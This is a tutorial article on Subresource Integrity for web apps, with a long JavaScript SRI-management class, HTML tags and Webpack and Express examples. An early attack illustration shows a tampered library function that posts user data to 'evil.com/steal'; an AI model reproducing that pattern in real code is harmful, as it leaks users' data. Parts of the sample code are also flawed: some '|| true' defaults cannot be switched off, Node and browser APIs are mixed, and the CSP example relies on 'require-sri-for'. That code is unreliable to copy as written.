---
title: "Subresource Integrity (SRI)"
description: "Master Subresource Integrity for secure resource loading. Learn to implement SRI hashes, prevent tampering of external resources, ensure CDN security, and build robust resource integrity verification systems."
slidesUrl: "https://github.com/AherRahul/portfolio-v1/blob/main/content/articles"
dateModified: "2026-03-22"
datePublished: "2026-03-22"
showOnArticles: false
courseName: 02-frontend-system-design
topics:
  - nodejs
  - javascript
  - frontend

---

![image.png](https://res.cloudinary.com/duojkrgue/image/upload/v1759048333/Portfolio/FrontendSystemDesignCourse/titleImages/22_yckj7t.png)

Subresource Integrity (SRI) – Ensuring Trusted Resource Loading in Web Applications
------------------------------------------------------------------------------------

Imagine loading a critical JavaScript library from a CDN, only to discover that an attacker has compromised the CDN and replaced your trusted library with malicious code that steals user credentials. This is the nightmare scenario that Subresource Integrity (SRI) prevents—by providing cryptographic verification that ensures the resources your application loads are exactly what you expect, without any unauthorized modifications.

**Subresource Integrity (SRI)** is a web security standard that allows browsers to verify that resources (scripts, stylesheets, and other files) loaded from external sources haven't been tampered with. SRI works by providing cryptographic hashes of the expected content, enabling browsers to compare the downloaded resource against the known-good hash and reject it if there's any mismatch.

In modern web development where applications heavily rely on CDNs, third-party libraries, and external resources for performance and functionality, SRI becomes critical for maintaining security and integrity. A single compromised external resource can lead to complete application compromise, data theft, or malicious code execution—making resource integrity verification essential for robust security architecture.

In this comprehensive guide, we'll explore Subresource Integrity implementation strategies, from understanding cryptographic hashing and integrity verification to building automated SRI management systems and comprehensive resource security architectures that protect applications against supply chain attacks.

## Understanding Subresource Integrity Architecture

SRI provides a browser-based security mechanism that verifies resource integrity at load time, creating a trust boundary between your application and external content providers.

### The Theoretical Foundation of Resource Integrity

**What is Resource Integrity?**
Resource integrity means ensuring that a file you're loading (JavaScript, CSS, images, etc.) is exactly the same as what you intended to load, without any unauthorized modifications. Think of it like a digital seal of authenticity that browsers can verify before executing or applying the resource.

**The Security Problem SRI Solves:**

**CDN Compromise Scenarios:**
- **Direct CDN Attack**: Attackers compromise the CDN provider and replace legitimate files with malicious ones
- **DNS Hijacking**: Attackers redirect CDN domains to servers they control
- **BGP Hijacking**: Network-level attacks that reroute traffic to malicious servers
- **Supply Chain Attacks**: Compromised build processes inject malicious code into otherwise legitimate libraries

**Real-World Attack Examples:**

**Example 1: CDN Compromise**
```html
<!-- What you intended to load -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

<!-- What an attacker might serve instead -->
<!-- Same URL, but the file now contains: -->
<!--   - Keylogger functionality -->
<!--   - Cryptocurrency mining scripts -->
<!--   - Data exfiltration code -->
```

**Example 2: Library Replacement Attack**
```javascript
// Original library function
function processUserData(data) {
  return sanitizeInput(data);
}

// Compromised version
function processUserData(data) {
  // Malicious code: send data to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
  
  return sanitizeInput(data); // Still works to avoid detection
}
```

**How SRI Prevents These Attacks:**
SRI creates a cryptographic link between your application and the expected content:

1. **Hash Generation**: Create a cryptographic hash of the trusted resource
2. **Integrity Attribute**: Include the hash in the HTML integrity attribute
3. **Browser Verification**: Browser downloads the resource and computes its hash
4. **Comparison**: Browser compares computed hash with expected hash
5. **Decision**: If hashes match, load resource; if not, block and report error

### SRI Security Model

```
🔐 Subresource Integrity Security Flow

📥 Resource Request Flow
   • Browser requests resource from external source
   • Resource downloaded with integrity constraints
   • Cryptographic hash computed on received content
   • Hash comparison against expected integrity value

✅ Verification Success Path
   • Computed hash matches expected hash
   • Resource passes integrity check
   • Resource loaded and executed/applied
   • Normal application functionality continues

❌ Verification Failure Path
   • Computed hash doesn't match expected hash
   • Resource fails integrity check
   • Resource loading blocked by browser
   • Console error logged and CSP report sent

🔒 Security Guarantees
   • Content authenticity verification
   • Tamper detection and prevention  
   • Supply chain attack mitigation
   • CDN compromise protection

⚡ Hash Algorithm Support
   • SHA-256: Recommended for new implementations
   • SHA-384: Higher security, slightly larger hashes
   • SHA-512: Maximum security, largest hashes
   • Multiple algorithms: Fallback and migration support
```

## Advanced Subresource Integrity Implementation

Building comprehensive SRI systems requires automated hash generation, integrity monitoring, fallback strategies, and integration with content delivery and security monitoring systems.

### Enterprise-Grade SRI Management Framework

```javascript
/**
 * Advanced Subresource Integrity Management System
 * Comprehensive framework for automated hash generation, verification, and resource security
 */

class SubresourceIntegrityManager {
  constructor(config = {}) {
    this.config = {
      // Hash algorithm preferences
      preferredAlgorithm: config.preferredAlgorithm || 'sha384',
      supportedAlgorithms: config.supportedAlgorithms || ['sha256', 'sha384', 'sha512'],
      enableMultipleHashes: config.enableMultipleHashes || true,
      
      // Resource management
      autoGenerateHashes: config.autoGenerateHashes !== false,
      hashCacheEnabled: config.hashCacheEnabled !== false,
      cacheTimeout: config.cacheTimeout || 86400000, // 24 hours
      
      // Security policies
      strictMode: config.strictMode !== false,
      allowFallback: config.allowFallback || true,
      fallbackStrategy: config.fallbackStrategy || 'local', // 'local', 'alternative-cdn', 'disable'
      
      // Monitoring and reporting
      enableIntegrityReporting: config.enableIntegrityReporting !== false,
      reportingEndpoint: config.reportingEndpoint || '/api/sri-violations',
      enablePerformanceMetrics: config.enablePerformanceMetrics || true,
      
      // Automated hash updates
      enableHashUpdates: config.enableHashUpdates || false,
      updateCheckInterval: config.updateCheckInterval || 3600000, // 1 hour
      trustedSources: config.trustedSources || [],
      
      // Development features
      developmentMode: config.developmentMode || false,
      skipHashValidation: config.skipHashValidation || false,
      
      ...config
    };

    // Internal state
    this.hashCache = new Map();
    this.resourceMetadata = new Map();
    this.integrityViolations = [];
    this.hashUpdateQueue = [];
    
    // Supported resource types
    this.supportedTypes = new Set([
      'script', 'link', 'img', 'audio', 'video', 'object', 'embed'
    ]);
    
    // Statistics
    this.stats = {
      hashesGenerated: 0,
      integrityChecksPerformed: 0,
      integrityViolations: 0,
      resourcesVerified: 0,
      hashUpdates: 0
    };

    this.initialize();
  }

  // Initialize the SRI management system
  async initialize() {
    // Set up browser integrity violation reporting
    this.setupIntegrityReporting();
    
    // Initialize hash cache
    await this.loadHashCache();
    
    // Set up automatic hash updates if enabled
    if (this.config.enableHashUpdates) {
      this.startHashUpdateMonitoring();
    }
    
    // Set up performance monitoring
    if (this.config.enablePerformanceMetrics) {
      this.setupPerformanceMonitoring();
    }
  }

  // Generate SRI hash for a given resource
  async generateHash(content, algorithms = null) {
    this.stats.hashesGenerated++;
    
    const algorithmsToUse = algorithms || [this.config.preferredAlgorithm];
    const hashes = {};
    
    // Convert content to buffer if it's a string
    const buffer = typeof content === 'string' ? 
      Buffer.from(content, 'utf-8') : 
      content;
    
    for (const algorithm of algorithmsToUse) {
      if (!this.config.supportedAlgorithms.includes(algorithm)) {
        throw new SRIError(`Unsupported hash algorithm: ${algorithm}`);
      }
      
      try {
        const crypto = require('crypto');
        const hash = crypto.createHash(algorithm).update(buffer).digest('base64');
        hashes[algorithm] = hash;
      } catch (error) {
        throw new SRIError(`Failed to generate ${algorithm} hash: ${error.message}`);
      }
    }
    
    return hashes;
  }

  // Generate SRI hash from URL
  async generateHashFromUrl(url, options = {}) {
    try {
      const response = await this.fetchResource(url, options);
      const content = await response.arrayBuffer();
      const buffer = Buffer.from(content);
      
      const algorithms = options.algorithms || [this.config.preferredAlgorithm];
      const hashes = await this.generateHash(buffer, algorithms);
      
      // Store metadata
      this.resourceMetadata.set(url, {
        url,
        size: buffer.length,
        contentType: response.headers.get('content-type'),
        lastModified: response.headers.get('last-modified'),
        etag: response.headers.get('etag'),
        hashes,
        generatedAt: Date.now()
      });
      
      // Cache the hashes
      if (this.config.hashCacheEnabled) {
        this.cacheHashes(url, hashes);
      }
      
      return hashes;
      
    } catch (error) {
      throw new SRIError(`Failed to generate hash from URL ${url}: ${error.message}`);
    }
  }

  // Format hash for HTML integrity attribute
  formatIntegrityValue(hashes) {
    if (typeof hashes === 'string') {
      // Single hash string format like "sha384-abc123..."
      return hashes;
    }
    
    if (typeof hashes === 'object') {
      const integrityValues = [];
      
      for (const [algorithm, hash] of Object.entries(hashes)) {
        integrityValues.push(`${algorithm}-${hash}`);
      }
      
      return integrityValues.join(' ');
    }
    
    throw new SRIError('Invalid hash format');
  }

  // Generate complete SRI attributes for HTML elements
  generateSRIAttributes(url, hashes, options = {}) {
    const attributes = {};
    
    // Integrity attribute
    attributes.integrity = this.formatIntegrityValue(hashes);
    
    // Crossorigin attribute (required for SRI with cross-origin resources)
    if (options.crossorigin !== false) {
      attributes.crossorigin = options.crossorigin || 'anonymous';
    }
    
    // Referrer policy
    if (options.referrerpolicy) {
      attributes.referrerpolicy = options.referrerpolicy;
    }
    
    return attributes;
  }

  // Automated hash generation for build processes
  async processResourcesForBuild(resources, buildOptions = {}) {
    const processedResources = [];
    
    for (const resource of resources) {
      try {
        const resourceInfo = await this.processResourceForBuild(resource, buildOptions);
        processedResources.push(resourceInfo);
      } catch (error) {
        if (buildOptions.failOnError !== false) {
          throw error;
        } else {
          console.warn(`Failed to process resource ${resource.url}: ${error.message}`);
          processedResources.push({
            ...resource,
            error: error.message,
            sri: null
          });
        }
      }
    }
    
    return processedResources;
  }

  // Process individual resource for build
  async processResourceForBuild(resource, buildOptions = {}) {
    const { url, type, fallback } = resource;
    
    // Generate hashes
    const algorithms = buildOptions.algorithms || 
      (this.config.enableMultipleHashes ? 
        [this.config.preferredAlgorithm, 'sha256'] : 
        [this.config.preferredAlgorithm]);
    
    const hashes = await this.generateHashFromUrl(url, { algorithms });
    
    // Generate SRI attributes
    const sriAttributes = this.generateSRIAttributes(url, hashes, {
      crossorigin: buildOptions.crossorigin,
      referrerpolicy: buildOptions.referrerpolicy
    });
    
    // Generate fallback hashes if provided
    let fallbackSRI = null;
    if (fallback && this.config.allowFallback) {
      try {
        const fallbackHashes = await this.generateHashFromUrl(fallback.url, { algorithms });
        fallbackSRI = this.generateSRIAttributes(fallback.url, fallbackHashes);
      } catch (error) {
        console.warn(`Failed to generate fallback SRI for ${fallback.url}: ${error.message}`);
      }
    }
    
    return {
      url,
      type,
      hashes,
      sri: sriAttributes,
      fallback: fallbackSRI,
      metadata: this.resourceMetadata.get(url)
    };
  }

  // HTML generation helpers
  generateScriptTag(resource) {
    const { url, sri } = resource;
    const attributes = Object.entries(sri)
      .map(([key, value]) => `${key}="${value}"`)
      .join(' ');
    
    return `<script src="${url}" ${attributes}></script>`;
  }

  generateLinkTag(resource) {
    const { url, sri } = resource;
    const attributes = Object.entries(sri)
      .map(([key, value]) => `${key}="${value}"`)
      .join(' ');
    
    return `<link rel="stylesheet" href="${url}" ${attributes}>`;
  }

  // Integrity violation monitoring
  setupIntegrityReporting() {
    if (!this.config.enableIntegrityReporting || typeof window === 'undefined') {
      return;
    }
    
    // Listen for integrity violations
    window.addEventListener('securitypolicyviolation', (event) => {
      if (event.violatedDirective === 'require-sri-for') {
        this.reportIntegrityViolation({
          type: 'sri-required-missing',
          violatedDirective: event.violatedDirective,
          blockedURI: event.blockedURI,
          documentURI: event.documentURI,
          timestamp: Date.now()
        });
      }
    });
    
    // Listen for resource load errors that might be SRI-related
    ['script', 'link'].forEach(tagName => {
      document.addEventListener('error', (event) => {
        const element = event.target;
        if (element.tagName.toLowerCase() === tagName && element.hasAttribute('integrity')) {
          this.reportIntegrityViolation({
            type: 'sri-verification-failed',
            resource: element.src || element.href,
            integrity: element.getAttribute('integrity'),
            timestamp: Date.now()
          });
        }
      }, true);
    });
  }

  // Report integrity violations
  async reportIntegrityViolation(violation) {
    this.stats.integrityViolations++;
    this.integrityViolations.push(violation);
    
    // Send to reporting endpoint
    if (this.config.reportingEndpoint) {
      try {
        await fetch(this.config.reportingEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            type: 'sri-violation',
            violation,
            userAgent: navigator.userAgent,
            timestamp: Date.now()
          })
        });
      } catch (error) {
        console.error('Failed to report SRI violation:', error);
      }
    }
    
    // Log locally
    console.warn('SRI Violation:', violation);
  }

  // Hash cache management
  cacheHashes(url, hashes) {
    this.hashCache.set(url, {
      hashes,
      timestamp: Date.now(),
      expiresAt: Date.now() + this.config.cacheTimeout
    });
  }

  getCachedHashes(url) {
    const cached = this.hashCache.get(url);
    if (!cached || Date.now() > cached.expiresAt) {
      this.hashCache.delete(url);
      return null;
    }
    
    return cached.hashes;
  }

  async loadHashCache() {
    // Load cache from storage (localStorage, database, etc.)
    if (typeof localStorage !== 'undefined') {
      try {
        const cacheData = localStorage.getItem('sri-hash-cache');
        if (cacheData) {
          const cache = JSON.parse(cacheData);
          for (const [url, data] of Object.entries(cache)) {
            if (Date.now() < data.expiresAt) {
              this.hashCache.set(url, data);
            }
          }
        }
      } catch (error) {
        console.warn('Failed to load SRI hash cache:', error);
      }
    }
  }

  saveHashCache() {
    if (typeof localStorage !== 'undefined') {
      try {
        const cacheObject = Object.fromEntries(this.hashCache);
        localStorage.setItem('sri-hash-cache', JSON.stringify(cacheObject));
      } catch (error) {
        console.warn('Failed to save SRI hash cache:', error);
      }
    }
  }

  // Automated hash updates
  startHashUpdateMonitoring() {
    setInterval(() => {
      this.checkForHashUpdates();
    }, this.config.updateCheckInterval);
  }

  async checkForHashUpdates() {
    for (const [url, metadata] of this.resourceMetadata) {
      try {
        const currentHashes = await this.generateHashFromUrl(url, { 
          skipCache: true 
        });
        
        const storedHashes = metadata.hashes;
        
        if (!this.hashesMatch(currentHashes, storedHashes)) {
          this.hashUpdateQueue.push({
            url,
            oldHashes: storedHashes,
            newHashes: currentHashes,
            detectedAt: Date.now()
          });
          
          this.stats.hashUpdates++;
          
          // Notify about hash change
          this.notifyHashChange(url, storedHashes, currentHashes);
        }
      } catch (error) {
        console.warn(`Hash update check failed for ${url}:`, error);
      }
    }
  }

  hashesMatch(hashes1, hashes2) {
    const alg1 = Object.keys(hashes1)[0];
    const alg2 = Object.keys(hashes2)[0];
    
    if (alg1 !== alg2) return false;
    return hashes1[alg1] === hashes2[alg2];
  }

  notifyHashChange(url, oldHashes, newHashes) {
    const notification = {
      type: 'hash-change-detected',
      url,
      oldHashes,
      newHashes,
      timestamp: Date.now()
    };
    
    // Send notification
    if (this.config.hashChangeEndpoint) {
      fetch(this.config.hashChangeEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(notification)
      }).catch(console.error);
    }
    
    console.warn('Resource hash changed:', notification);
  }

  // Resource fetching with proper error handling
  async fetchResource(url, options = {}) {
    const fetchOptions = {
      method: 'GET',
      headers: {},
      ...options.fetchOptions
    };
    
    // Add cache-busting if needed
    if (options.skipCache) {
      const separator = url.includes('?') ? '&' : '?';
      url = `${url}${separator}_sri_cache_bust=${Date.now()}`;
    }
    
    const response = await fetch(url, fetchOptions);
    
    if (!response.ok) {
      throw new SRIError(`Failed to fetch resource: ${response.status} ${response.statusText}`);
    }
    
    return response;
  }

  // Utility methods for build tools
  async generateSRIWebpackPlugin() {
    // Generate webpack plugin configuration for SRI
    return {
      hashFuncNames: this.config.supportedAlgorithms,
      enabled: !this.config.developmentMode
    };
  }

  generateSRIHtmlWebpackPlugin() {
    // Generate HTML webpack plugin configuration for SRI
    return {
      sri: {
        hashFuncNames: this.config.supportedAlgorithms,
        enabled: !this.config.developmentMode
      }
    };
  }

  // Performance monitoring
  setupPerformanceMonitoring() {
    if (typeof window !== 'undefined') {
      // Monitor resource load times
      const observer = new PerformanceObserver((list) => {
        for (const entry of list.getEntries()) {
          if (entry.initiatorType === 'script' || entry.initiatorType === 'link') {
            this.recordResourcePerformance(entry);
          }
        }
      });
      
      observer.observe({ entryTypes: ['resource'] });
    }
  }

  recordResourcePerformance(entry) {
    const performanceData = {
      name: entry.name,
      startTime: entry.startTime,
      duration: entry.duration,
      transferSize: entry.transferSize,
      encodedBodySize: entry.encodedBodySize,
      decodedBodySize: entry.decodedBodySize
    };
    
    // Store performance data for analysis
    const metadata = this.resourceMetadata.get(entry.name);
    if (metadata) {
      metadata.performance = performanceData;
    }
  }

  // Security analysis
  analyzeSecurityPosture() {
    const analysis = {
      totalResources: this.resourceMetadata.size,
      protectedResources: 0,
      vulnerableResources: [],
      recommendations: []
    };
    
    for (const [url, metadata] of this.resourceMetadata) {
      if (metadata.hashes && Object.keys(metadata.hashes).length > 0) {
        analysis.protectedResources++;
      } else {
        analysis.vulnerableResources.push(url);
      }
    }
    
    // Generate recommendations
    if (analysis.vulnerableResources.length > 0) {
      analysis.recommendations.push({
        priority: 'high',
        message: `${analysis.vulnerableResources.length} resources lack SRI protection`,
        action: 'Generate and apply SRI hashes to all external resources'
      });
    }
    
    if (this.integrityViolations.length > 0) {
      analysis.recommendations.push({
        priority: 'critical',
        message: `${this.integrityViolations.length} integrity violations detected`,
        action: 'Investigate and resolve integrity violations immediately'
      });
    }
    
    return analysis;
  }

  // Public API methods
  async getResourceSRI(url, options = {}) {
    // Check cache first
    const cached = this.getCachedHashes(url);
    if (cached && !options.skipCache) {
      return this.generateSRIAttributes(url, cached, options);
    }
    
    // Generate new hashes
    const hashes = await this.generateHashFromUrl(url, options);
    return this.generateSRIAttributes(url, hashes, options);
  }

  async verifyResourceIntegrity(url, expectedHashes) {
    this.stats.integrityChecksPerformed++;
    
    try {
      const currentHashes = await this.generateHashFromUrl(url, { 
        skipCache: true 
      });
      
      const matches = this.hashesMatch(currentHashes, expectedHashes);
      
      if (matches) {
        this.stats.resourcesVerified++;
      } else {
        this.reportIntegrityViolation({
          type: 'hash-mismatch',
          url,
          expected: expectedHashes,
          actual: currentHashes,
          timestamp: Date.now()
        });
      }
      
      return matches;
    } catch (error) {
      throw new SRIError(`Integrity verification failed for ${url}: ${error.message}`);
    }
  }

  getSecurityReport() {
    return {
      timestamp: Date.now(),
      stats: this.stats,
      securityAnalysis: this.analyzeSecurityPosture(),
      recentViolations: this.integrityViolations.slice(-10),
      hashUpdates: this.hashUpdateQueue.slice(-10),
      cacheInfo: {
        size: this.hashCache.size,
        resourcesTracked: this.resourceMetadata.size
      }
    };
  }

  // Cleanup
  destroy() {
    this.saveHashCache();
  }
}

// Custom error class
class SRIError extends Error {
  constructor(message, details) {
    super(message);
    this.name = 'SRIError';
    this.details = details;
  }
}

// Usage Examples
const sriManager = new SubresourceIntegrityManager({
  preferredAlgorithm: 'sha384',
  enableMultipleHashes: true,
  autoGenerateHashes: true,
  enableIntegrityReporting: true
});

// Example 1: Generate SRI for a single resource
async function addSRIToResource() {
  try {
    const sri = await sriManager.getResourceSRI(
      'https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css'
    );
    
    console.log('SRI Attributes:', sri);
    // Output: { integrity: "sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3", crossorigin: "anonymous" }
    
    return `<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="${sri.integrity}" crossorigin="${sri.crossorigin}">`;
  } catch (error) {
    console.error('Failed to generate SRI:', error);
  }
}

// Example 2: Batch process resources for build
async function generateSRIForBuild() {
  const resources = [
    { url: 'https://cdn.jsdelivr.net/npm/react@17.0.2/umd/react.production.min.js', type: 'script' },
    { url: 'https://cdn.jsdelivr.net/npm/react-dom@17.0.2/umd/react-dom.production.min.js', type: 'script' },
    { url: 'https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css', type: 'link' }
  ];
  
  const processedResources = await sriManager.processResourcesForBuild(resources, {
    algorithms: ['sha384', 'sha256'],
    crossorigin: 'anonymous',
    failOnError: true
  });
  
  // Generate HTML tags
  processedResources.forEach(resource => {
    if (resource.type === 'script') {
      console.log(sriManager.generateScriptTag(resource));
    } else if (resource.type === 'link') {
      console.log(sriManager.generateLinkTag(resource));
    }
  });
}

// Example 3: Webpack integration
function getSRIWebpackConfig() {
  return {
    plugins: [
      new (require('webpack-subresource-integrity'))({
        hashFuncNames: ['sha256', 'sha384'],
        enabled: process.env.NODE_ENV === 'production'
      })
    ]
  };
}

// Example 4: Express.js middleware for SRI headers
function sriMiddleware(req, res, next) {
  // Add CSP header to require SRI
  res.setHeader('Content-Security-Policy', 
    "require-sri-for script style; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'"
  );
  next();
}

// Example 5: Resource integrity verification
async function verifyResourceIntegrity() {
  const url = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
  const expectedHash = {
    sha384: 'vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GlQzH8PYamvpn'
  };
  
  try {
    const isValid = await sriManager.verifyResourceIntegrity(url, expectedHash);
    console.log('Resource integrity valid:', isValid);
  } catch (error) {
    console.error('Integrity verification failed:', error);
  }
}

// Example 6: Security monitoring
setInterval(() => {
  const report = sriManager.getSecurityReport();
  if (report.stats.integrityViolations > 0) {
    console.warn('SRI violations detected:', report);
    // Send alert to security team
  }
}, 60000);

export { SubresourceIntegrityManager, SRIError };
```

### Understanding the SRI Management Framework Code

Let's explore how this comprehensive Subresource Integrity system works and why each component is critical for ensuring resource security and integrity.

#### 1. Framework Architecture and Hash Generation

**The Core SRI Philosophy:**
The `SubresourceIntegrityManager` creates cryptographic fingerprints of resources that browsers can use to verify authenticity and detect tampering.

**Hash Generation Process:**
```javascript
async generateHash(content, algorithms = null) {
  const algorithmsToUse = algorithms || [this.config.preferredAlgorithm];
  const hashes = {};
  
  const buffer = typeof content === 'string' ? 
    Buffer.from(content, 'utf-8') : 
    content;
  
  for (const algorithm of algorithmsToUse) {
    const crypto = require('crypto');
    const hash = crypto.createHash(algorithm).update(buffer).digest('base64');
    hashes[algorithm] = hash;
  }
  
  return hashes;
}
```

**Why This Process Works:**
- **Cryptographic Security**: Uses SHA-256, SHA-384, or SHA-512 algorithms
- **Multiple Algorithm Support**: Provides fallback and migration paths
- **Base64 Encoding**: Standard format for HTML integrity attributes
- **Buffer Handling**: Properly processes both string and binary content

#### 2. Automated Resource Processing

**Build-Time Hash Generation:**
```javascript
async processResourceForBuild(resource, buildOptions = {}) {
  const { url, type, fallback } = resource;
  
  // Generate hashes
  const algorithms = buildOptions.algorithms || 
    (this.config.enableMultipleHashes ? 
      [this.config.preferredAlgorithm, 'sha256'] : 
      [this.config.preferredAlgorithm]);
  
  const hashes = await this.generateHashFromUrl(url, { algorithms });
  
  // Generate SRI attributes
  const sriAttributes = this.generateSRIAttributes(url, hashes, {
    crossorigin: buildOptions.crossorigin,
    referrerpolicy: buildOptions.referrerpolicy
  });
  
  return {
    url,
    type,
    hashes,
    sri: sriAttributes,
    metadata: this.resourceMetadata.get(url)
  };
}
```

**Build Integration Benefits:**
- **Automated Process**: No manual hash generation required
- **Multiple Resources**: Batch processing for entire dependency lists
- **Fallback Support**: Alternative resources if primary fails
- **Metadata Tracking**: Complete resource information for debugging

#### 3. HTML Attribute Generation

**SRI Attribute Formatting:**
```javascript
generateSRIAttributes(url, hashes, options = {}) {
  const attributes = {};
  
  // Integrity attribute
  attributes.integrity = this.formatIntegrityValue(hashes);
  
  // Crossorigin attribute (required for SRI with cross-origin resources)
  if (options.crossorigin !== false) {
    attributes.crossorigin = options.crossorigin || 'anonymous';
  }
  
  return attributes;
}
```

**Attribute Requirements:**
- **integrity**: Contains the cryptographic hash(es)
- **crossorigin**: Required for cross-origin resources (CORS)
- **referrerpolicy**: Controls referrer information sent

**HTML Output Examples:**
```html
<!-- Single hash -->
<script src="https://cdn.example.com/lib.js" 
        integrity="sha384-abc123..." 
        crossorigin="anonymous"></script>

<!-- Multiple hashes for fallback -->
<script src="https://cdn.example.com/lib.js" 
        integrity="sha384-abc123... sha256-def456..." 
        crossorigin="anonymous"></script>
```

#### 4. Integrity Violation Monitoring

**Browser Event Handling:**
```javascript
setupIntegrityReporting() {
  // Listen for resource load errors that might be SRI-related
  ['script', 'link'].forEach(tagName => {
    document.addEventListener('error', (event) => {
      const element = event.target;
      if (element.tagName.toLowerCase() === tagName && element.hasAttribute('integrity')) {
        this.reportIntegrityViolation({
          type: 'sri-verification-failed',
          resource: element.src || element.href,
          integrity: element.getAttribute('integrity'),
          timestamp: Date.now()
        });
      }
    }, true);
  });
}
```

**Violation Types Detected:**
- **sri-verification-failed**: Hash doesn't match downloaded content
- **sri-required-missing**: CSP requires SRI but resource lacks it
- **hash-mismatch**: Resource content has changed unexpectedly
- **fetch-failed**: Resource unavailable or network error

#### 5. Cache Management System

**Hash Caching Strategy:**
```javascript
cacheHashes(url, hashes) {
  this.hashCache.set(url, {
    hashes,
    timestamp: Date.now(),
    expiresAt: Date.now() + this.config.cacheTimeout
  });
}

getCachedHashes(url) {
  const cached = this.hashCache.get(url);
  if (!cached || Date.now() > cached.expiresAt) {
    this.hashCache.delete(url);
    return null;
  }
  
  return cached.hashes;
}
```

**Caching Benefits:**
- **Performance**: Avoid re-downloading resources for hash generation
- **Reliability**: Reduce dependency on external services
- **Offline Support**: Cache enables offline hash verification
- **Automatic Cleanup**: Expired cache entries are removed

#### 6. Automated Hash Updates

**Change Detection System:**
```javascript
async checkForHashUpdates() {
  for (const [url, metadata] of this.resourceMetadata) {
    try {
      const currentHashes = await this.generateHashFromUrl(url, { 
        skipCache: true 
      });
      
      const storedHashes = metadata.hashes;
      
      if (!this.hashesMatch(currentHashes, storedHashes)) {
        this.hashUpdateQueue.push({
          url,
          oldHashes: storedHashes,
          newHashes: currentHashes,
          detectedAt: Date.now()
        });
        
        // Notify about hash change
        this.notifyHashChange(url, storedHashes, currentHashes);
      }
    } catch (error) {
      console.warn(`Hash update check failed for ${url}:`, error);
    }
  }
}
```

**Update Detection Benefits:**
- **Security Monitoring**: Detect unauthorized resource changes
- **Maintenance Alerts**: Know when dependencies are updated
- **Automated Updates**: Automatically refresh hashes when needed
- **Attack Detection**: Identify potential supply chain attacks

#### 7. Real-World Integration Examples

**Webpack Integration:**
```javascript
// webpack.config.js
const SubresourceIntegrityPlugin = require('webpack-subresource-integrity');

module.exports = {
  plugins: [
    new SubresourceIntegrityPlugin({
      hashFuncNames: ['sha384', 'sha256'],
      enabled: process.env.NODE_ENV === 'production'
    })
  ],
  output: {
    crossOriginLoading: 'anonymous'
  }
};
```

**Express.js Middleware:**
```javascript
function sriMiddleware(req, res, next) {
  // Require SRI for all scripts and stylesheets
  res.setHeader('Content-Security-Policy', 
    "require-sri-for script style; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'"
  );
  next();
}

app.use(sriMiddleware);
```

#### 8. Security Analysis and Monitoring

**Security Posture Analysis:**
```javascript
analyzeSecurityPosture() {
  const analysis = {
    totalResources: this.resourceMetadata.size,
    protectedResources: 0,
    vulnerableResources: [],
    recommendations: []
  };
  
  for (const [url, metadata] of this.resourceMetadata) {
    if (metadata.hashes && Object.keys(metadata.hashes).length > 0) {
      analysis.protectedResources++;
    } else {
      analysis.vulnerableResources.push(url);
    }
  }
  
  return analysis;
}
```

**Security Metrics Tracked:**
- **Protected Resources**: Resources with valid SRI hashes
- **Vulnerable Resources**: External resources without SRI protection
- **Integrity Violations**: Failed verification attempts
- **Hash Updates**: Resource changes detected over time

This comprehensive SRI management framework provides enterprise-grade resource integrity protection through automated hash generation, intelligent caching, violation monitoring, and seamless build tool integration for modern web applications.

## Summary

Subresource Integrity (SRI) represents a critical security mechanism that protects web applications from supply chain attacks and resource tampering by providing cryptographic verification of external content. By implementing comprehensive SRI management through automated hash generation, intelligent monitoring, and build system integration, applications can ensure that third-party resources remain trustworthy and unmodified throughout their lifecycle.

**SRI Security Excellence Benefits:**
- **Supply Chain Protection**: Prevent attackers from serving malicious content through compromised CDNs or third-party services
- **Tamper Detection**: Immediately detect when external resources have been modified or compromised
- **Automated Security**: Build-time hash generation and verification eliminate manual security processes
- **Compliance Assurance**: Meet security standards requiring resource integrity verification

**Advanced SRI Management Capabilities:**
- **Multi-Algorithm Support**: Use SHA-256, SHA-384, and SHA-512 with fallback mechanisms for maximum compatibility
- **Intelligent Caching**: Performance optimization through hash caching and metadata management
- **Real-Time Monitoring**: Continuous integrity violation detection and automated security reporting
- **Build Tool Integration**: Seamless integration with Webpack, build pipelines, and deployment processes

**Security Architecture Patterns:**
- **Defense in Depth**: SRI as part of comprehensive Content Security Policy implementation
- **Automated Verification**: Continuous monitoring and verification of resource integrity
- **Fallback Strategies**: Alternative resources and graceful degradation when integrity checks fail
- **Performance Optimization**: Efficient hash management that doesn't compromise application performance

Subresource Integrity transforms web applications from vulnerable targets of supply chain attacks into secure platforms that can safely leverage external resources while maintaining complete visibility and control over resource authenticity and integrity.


*Effective SRI implementation doesn't just verify resource integrity—it creates a trust framework where applications can confidently use external dependencies while maintaining cryptographic proof of their authenticity and detecting any unauthorized modifications.*
